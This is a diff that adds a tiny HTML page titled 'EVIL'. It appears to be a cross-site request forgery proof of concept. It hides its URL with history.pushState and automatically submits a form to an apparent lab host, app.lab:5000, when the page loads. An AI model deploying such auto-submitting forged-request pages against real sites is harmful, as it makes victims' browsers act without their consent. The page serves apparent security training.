@@ -1,0 +1,13 @@
+<Body>
+  <H1>EVIL</H1>
+
+<script>
+    history.pushState('', '', '/')
+</script>
+<form action="http://app.lab:5000/?q=test" method="GET">
+    <input type="submit" value="Submit request" />
+</form>
+<script>
+    document.forms[0].submit();
+</script>
+</Body>
